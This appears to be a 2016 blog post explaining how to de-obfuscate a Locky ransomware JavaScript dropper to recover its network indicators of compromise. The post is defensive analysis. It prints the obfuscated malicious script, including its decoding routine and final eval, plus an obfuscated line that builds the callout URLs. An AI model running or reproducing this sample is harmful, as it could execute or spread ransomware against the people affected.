---
id: 154
title: Quickly De-obfuscating Locky Malware for Network IOCs
date: 2016-08-02T17:31:42+00:00
author: nwalsh
layout: post
guid: https://nwalsh.me/?p=154
permalink: /?p=154
categories:
  - General
  - Security
tags:
  - locky
  - malware
  - reverse engineering
---
Recently I have came across a couple of Locky campaigns and was interested to find the network callouts from the javascript file. Previously I had de-obfuscated the file manually to find the points of interest, but have came to find a better solution. However, before we get there we must first reverse the first layer of obfuscation.

<h1 style="text-align: center;">
  Reversing the First Layer
</h1>

The starting malicious Javascript file looks like this:

<pre>var a4WSssg = ';.}.\n.\r.;.).(.].c.Z.T.Z.Q.S.R.[.v.M.D.F. . . . .\n.\r.\n.\r.;.).2. .,.x.D.A.B.D.K.T.(.].).).(.}.;.s.B.Y.B.T.W.E. .n.r.u.t.e.r.{.).(.h.V.M.G. .n.o.i.t.c.n.u.f.(. .+. .p.L.M.H. .+. .0.n.N.X.H. .+. .4.h.D.W.N.N.G.Z.[.v.M.D.F. . . . .\n.\r.;.).).t.Q.S.P.(.i.F.C.I.W.K.Q.(.].).).(.}.;.2.l.S.G.H. .n.r.u.t.e.r.{.).(.8.r.G.L.V. .n.o.i.t.c.n.u.f.(. .+. .7.z.Z.U.C.U.W.H. .+. .h.T.K.I.P.Z.F.[.v.M.D.F. . . . .\n.\r.;.).(.].0.m.W.F.Q. .+. .b.G.A.X.B.Y.M.[.v.M.D.F. . . . .\n.\r. . . . . . . . . .;.s.F.G.H.Y.B.L. .=. .].0.t.I.H.K. .+. .i.F.Y.U.[.v.M.D.F. . . . .\n.\r.;.y.M.O.N.U.Z.Z. .=. .].4.q.T.W.P.[.v.M.D.F. . . . .\n.\r.;.).x.L.E.L. .+. .b.Z.A.Q. .+. .4.c.B.S.F.Y.D.S.(.].5.m.R.V.S. .+. .3.v.J.Y.T. .+. .).).(.}.;.8.x.H.J.F. .n.r.u.t.e.r.{.).(.1.n.H.J.R.H.T.G. .n.o.i.t.c.n.u.f.(. .+. .5.a.N.N.S.[.t.p.i.r.c.S.W. .=. ./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .v.M.D.F. .r.a.v. . . . .\n.\r.{.\n.\r.).t.Q.S.P. .,.x.D.A.B.D.K.T.(.1.l.S.F.M.Y.V.C. .n.o.i.t.c.n.u.f.\n.\r.\n.\r.\n.\r.;.}.\n.\r.;.h.K.M.N.C.Y.Z. .n.r.u.t.e.r.\t.\n.\r.\t.\n.\r.;.).".".(.].o.C.T.L.[.x.G.V.I.U.O.U. .=. .h.K.M.N.C.Y.Z.\t.\n.\r.\t.\n.\r.}.\t.\n.\r.;.).)./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .a.H.F.C.Q.P.R.(.].1.i.T.W.W. .+. .).).(.}.;.9.f.R.Y.G. .n.r.u.t.e.r.{.).(.c.N.J.K. .n.o.i.t.c.n.u.f.(. .+. .6.r.I.O.I.[.g.n.i.r.t.S.(.h.s.u.p...x.G.V.I.U.O.U.\t.\t.\n.\r.}.;.].w.J.F.Y.[.f.X.A.B. .=. ./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .a.H.F.C.Q.P.R.{.\t.\t.\t.\n.\r. .e.s.l.e.\t.\t.\n.\r.}.;.w.J.F.Y. .=. ./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .a.H.F.C.Q.P.R.{.\t.\t.\t.\n.\r. .).8.2.1. .. .].7.v.Q.D.A. .+. .f.Q.T.Q.[.n.B.K.H.E.H.X. .|.|. .4.2.0.1. .*. .0.5.1. .. .a.A.E.B.(. .f.i.\t.\t.\t.\n.\r.{.\t.\t.\n.\r.).7.v.X.B.H.X.Y.S. .=.=. .).6.1.5.2. .+. .5.1.5.2.-.(.(. .f.i.\t.\t.\n.\r.{.\t.\n.\r.y.r.t.\t.\n.\r.{.\n.\r.o.d.\n.\r.;.5.4. .+. .5.4.-. .=. .a.A.E.B. .r.a.v.\n.\r.;.3.2.6.3. .+. .2.2.6.3.-. .=. .7.v.X.B.H.X.Y.S. .r.a.v.\n.\r.\n.\r.;.}.\n.\r.}.\t.\n.\r.;.e.u.n.i.t.n.o.c.\t.\t.\n.\r.{.\t.\n.\r.).e.(. .h.c.t.a.c.\t.\n.\r.}.\t.\n.\r.;.k.a.e.r.b.\t.\t.\n.\r.;.).].5.e.A.S.X.[.6.w.V.O.Q.(.].5.m.R.V.S. .+. .3.v.J.Y.T. .+. .8.x.H.J.F. .+. .5.a.N.N.S.[.t.p.i.r.c.S.W. .=. .x.I.B.I.R.W.B. .r.a.v.\t.\t.\n.\r.{.\t.\n.\r. .y.r.t.\t.\n.\r.{.\n.\r.).+.+.5.e.A.S.X. .;.].).).(.}.;.7.v.Q.D.A. .n.r.u.t.e.r.{.).(.m.D.A.P.S.I.E. .n.o.i.t.c.n.u.f.(. .+. .f.Q.T.Q.[.6.w.V.O.Q. .

x = ""; for (i=0;i&lt;a4WSssg.length;i++)if(i%2==0)x+=a4WSssg.charAt(i);
a4WSssg = x;
a4WSssg = a4WSssg["spl"+"it"]('');
a4WSssg = a4WSssg["rever"+"se"]();
a4WSssg = a4WSssg["jo"+"in"]('');
var fprot=1;
if (fprot == 1) eval(a4WSssg);
</pre>

We can see that it will go through the very long string, pull every even character from it and then split it, reverse it, and join it together. These steps aren&#8217;t very interesting however because we can do a simple console.log to drop what the second part of the script will look like. Here is what we would run in a Javascript environment (I use [js.do](https://js.do/)), **make sure if you are running this locally to remove the eval**.

<pre>var a4WSssg = ';.}.\n.\r.;.).(.].c.Z.T.Z.Q.S.R.[.v.M.D.F. . . . .\n.\r.\n.\r.;.).2. .,.x.D.A.B.D.K.T.(.].).).(.}.;.s.B.Y.B.T.W.E. .n.r.u.t.e.r.{.).(.h.V.M.G. .n.o.i.t.c.n.u.f.(. .+. .p.L.M.H. .+. .0.n.N.X.H. .+. .4.h.D.W.N.N.G.Z.[.v.M.D.F. . . . .\n.\r.;.).).t.Q.S.P.(.i.F.C.I.W.K.Q.(.].).).(.}.;.2.l.S.G.H. .n.r.u.t.e.r.{.).(.8.r.G.L.V. .n.o.i.t.c.n.u.f.(. .+. .7.z.Z.U.C.U.W.H. .+. .h.T.K.I.P.Z.F.[.v.M.D.F. . . . .\n.\r.;.).(.].0.m.W.F.Q. .+. .b.G.A.X.B.Y.M.[.v.M.D.F. . . . .\n.\r. . . . . . . . . .;.s.F.G.H.Y.B.L. .=. .].0.t.I.H.K. .+. .i.F.Y.U.[.v.M.D.F. . . . .\n.\r.;.y.M.O.N.U.Z.Z. .=. .].4.q.T.W.P.[.v.M.D.F. . . . .\n.\r.;.).x.L.E.L. .+. .b.Z.A.Q. .+. .4.c.B.S.F.Y.D.S.(.].5.m.R.V.S. .+. .3.v.J.Y.T. .+. .).).(.}.;.8.x.H.J.F. .n.r.u.t.e.r.{.).(.1.n.H.J.R.H.T.G. .n.o.i.t.c.n.u.f.(. .+. .5.a.N.N.S.[.t.p.i.r.c.S.W. .=. ./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .v.M.D.F. .r.a.v. . . . .\n.\r.{.\n.\r.).t.Q.S.P. .,.x.D.A.B.D.K.T.(.1.l.S.F.M.Y.V.C. .n.o.i.t.c.n.u.f.\n.\r.\n.\r.\n.\r.;.}.\n.\r.;.h.K.M.N.C.Y.Z. .n.r.u.t.e.r.\t.\n.\r.\t.\n.\r.;.).".".(.].o.C.T.L.[.x.G.V.I.U.O.U. .=. .h.K.M.N.C.Y.Z.\t.\n.\r.\t.\n.\r.}.\t.\n.\r.;.).)./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .a.H.F.C.Q.P.R.(.].1.i.T.W.W. .+. .).).(.}.;.9.f.R.Y.G. .n.r.u.t.e.r.{.).(.c.N.J.K. .n.o.i.t.c.n.u.f.(. .+. .6.r.I.O.I.[.g.n.i.r.t.S.(.h.s.u.p...x.G.V.I.U.O.U.\t.\t.\n.\r.}.;.].w.J.F.Y.[.f.X.A.B. .=. ./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .a.H.F.C.Q.P.R.{.\t.\t.\t.\n.\r. .e.s.l.e.\t.\t.\n.\r.}.;.w.J.F.Y. .=. ./.*. . .c.X.Z. .J.W.k. .S.W.y. .*./. .a.H.F.C.Q.P.R.{.\t.\t.\t.\n.\r. .).8.2.1. .. .].7.v.Q.D.A. .+. .f.Q.T.Q.[.n.B.K.H.E.H.X. .|.|. .4.2.0.1. .*. .0.5.1. .. .a.A.E.B.(. .f.i.\t.\t.\t.\n.\r.{.\t.\t.\n.\r.).7.v.X.B.H.X.Y.S. .=.=. .).6.1.5.2. .+. .5.1.5.2.-.(.(. .f.i.\t.\t.\n.\r.{.\t.\n.\r.y.r.t.\t.\n.\r.{.\n.\r.o.d.\n.\r.;.5.4. .+. .5.4.-. .=. .a.A.E.B. .r.a.v.\n.\r.;.3.2.6.3. .+. .2.2.6.3.-. .=. .7.v.X.B.H.X.Y.S. .r.a.v.\n.\r.\n.\r.;.}.\n.\r.}.\t.\n.\r.;.e.u.n.i.t.n.o.c.\t.\t.\n.\r.{.\t.\n.\r.).e.(. .h.c.t.a.c.\t.\n.\r.}.\t.\n.\r.;.k.a.e.r.b.\t.\t.\n.\r.;.).].5.e.A.S.X.[.6.w.V.O.Q.(.].5.m.R.V.S. .+. .3.v.J.Y.T. .+. .8.x.H.J.F. .+. .5.a.N.N.S.[.t.p.i.r.c.S.W. .=. .x.I.B.I.R.W.B. .r.a.v.\t.\t.\n.\r.{.\t.\n.\r. .y.r.t.\t.\n.\r.{.\n.\r.).+.+.5.e.A.S.X. .;.].).).(.}.;.7.v.Q.D.A. .n.r.u.t.e.r.{.).(.m.D.A.P.S.I.E. .n.o.i.t.c.n.u.f.(. .+. .f.Q.T.Q.[.6.w.V.O.Q. .

x = ""; for (i=0;i&lt;a4WSssg.length;i++)if(i%2==0)x+=a4WSssg.charAt(i);
a4WSssg = x;
a4WSssg = a4WSssg["spl"+"it"]('');
a4WSssg = a4WSssg["rever"+"se"]();
a4WSssg = a4WSssg["jo"+"in"]('');
console.log(a4WSssg);
</pre>

After running this we should have bypassed the first layer of obfuscation and have a completely different script.

[<img class="aligncenter wp-image-157 size-medium" src="https://nwalsh.me/wp-content/uploads/2016/08/reverse_first_layer-1-300x241.png" alt="reverse_first_layer" width="300" height="241" srcset="https://nwalsh.me/wp-content/uploads/2016/08/reverse_first_layer-1-300x241.png 300w, https://nwalsh.me/wp-content/uploads/2016/08/reverse_first_layer-1-624x502.png 624w, https://nwalsh.me/wp-content/uploads/2016/08/reverse_first_layer-1.png 647w" sizes="(max-width: 300px) 100vw, 300px" />](https://nwalsh.me/wp-content/uploads/2016/08/reverse_first_layer-1.png)

<h1 style="text-align: center;">
  Reversing Second Layer Encryption
</h1>

There is a tool that will preform good de-obfuscation techniques on a javascript file, called JSDetox. Installing and running JSDetox was very easy, and it allows us to upload Javascript files to its web portal. Therefore we will upload the second layer obfuscated script and let it work its magic (we are mainly using its ability to do smarter string concatenation).

[<img class="aligncenter wp-image-155 size-large" src="https://nwalsh.me/wp-content/uploads/2016/08/jsdetox-1024x242.png" alt="Putting Second Layer Script into JSDetox " width="625" height="148" srcset="https://nwalsh.me/wp-content/uploads/2016/08/jsdetox-1024x242.png 1024w, https://nwalsh.me/wp-content/uploads/2016/08/jsdetox-300x71.png 300w, https://nwalsh.me/wp-content/uploads/2016/08/jsdetox-768x182.png 768w, https://nwalsh.me/wp-content/uploads/2016/08/jsdetox-624x148.png 624w, https://nwalsh.me/wp-content/uploads/2016/08/jsdetox.png 1565w" sizes="(max-width: 625px) 100vw, 625px" />](https://nwalsh.me/wp-content/uploads/2016/08/jsdetox.png)

Hitting the &#8216;Analyze&#8217; button will provide us with an analyzed version of the script below. Now, we look through this analyzed version for anything interesting.

<div id="attachment_158" style="width: 635px" class="wp-caption aligncenter">
  <a href="https://nwalsh.me/wp-content/uploads/2016/08/website_calls.png"><img class="size-large wp-image-158" src="https://nwalsh.me/wp-content/uploads/2016/08/website_calls-1024x182.png" alt="Interesting Websites" width="625" height="111" srcset="https://nwalsh.me/wp-content/uploads/2016/08/website_calls-1024x182.png 1024w, https://nwalsh.me/wp-content/uploads/2016/08/website_calls-300x53.png 300w, https://nwalsh.me/wp-content/uploads/2016/08/website_calls-768x136.png 768w, https://nwalsh.me/wp-content/uploads/2016/08/website_calls-624x111.png 624w, https://nwalsh.me/wp-content/uploads/2016/08/website_calls.png 1116w" sizes="(max-width: 625px) 100vw, 625px" /></a>
  
  <p class="wp-caption-text">
    Interesting Websites
  </p>
</div>

On line 210 I see what appears to be the program building strings for the callouts that Locky will use. This is the information we are looking for, so what we can do is remove all code in the script below this and console.log the variable that contains all the websites. Doing so allows us to easily get all the websites that it will call.

Notice below, here is the obfuscated line without the JSDetox string replacements. It would be nearly impossible to know that this was where the websites are being built just by looking at the code.

<pre>var ULNNVGt = [CVJf+SPBq9 + PEOo(REHYTRw8)+IWSg5+(function SAYi(){return QGVYMLb;}())+PVNNUCs + OHOBMQv+OPGJMYc+ODLx+(function RISd8(){return QSAJKKm;}()) + HWUc1+ZGKIFDw, FJHHTSe(TPWx6) + RYOe8+MMMn+NYGQBSb+GGLCWQp + (function GKJDDCc8(){return MNWTGMa;}())+LPIr+RHTn+AQUz4 + RKCr+CWSLEJg8 + ZMAy7, TPWx6 + RYOe8+SPWWTLu + TGHu+PQTa7(FKEm)+LCKk8+GBWLTBa6 + XICOEOe+LBKMLKr9(ATXz9) + CZJUBWf+DRJPXMe+(function MZFGPXk(){return FYFc;}()) + (function IDDd5(){return ZHQu;}())+BVJz+JGNNUMq(KZNb)];
</pre>

We now run the script with a console.log with the variable that contains the website addresses and we receive the following:
  
[<img class="aligncenter size-full wp-image-160" src="https://nwalsh.me/wp-content/uploads/2016/08/websites_locky.png" alt="websites_locky" width="663" height="17" srcset="https://nwalsh.me/wp-content/uploads/2016/08/websites_locky.png 663w, https://nwalsh.me/wp-content/uploads/2016/08/websites_locky-300x8.png 300w, https://nwalsh.me/wp-content/uploads/2016/08/websites_locky-624x16.png 624w" sizes="(max-width: 663px) 100vw, 663px" />](https://nwalsh.me/wp-content/uploads/2016/08/websites_locky.png)These are the IOCs that we are looking for so we are done at this point. This method takes about 5 minutes which is a lot faster than the 1-2 hours that I had spent doing the deobfuscation manually.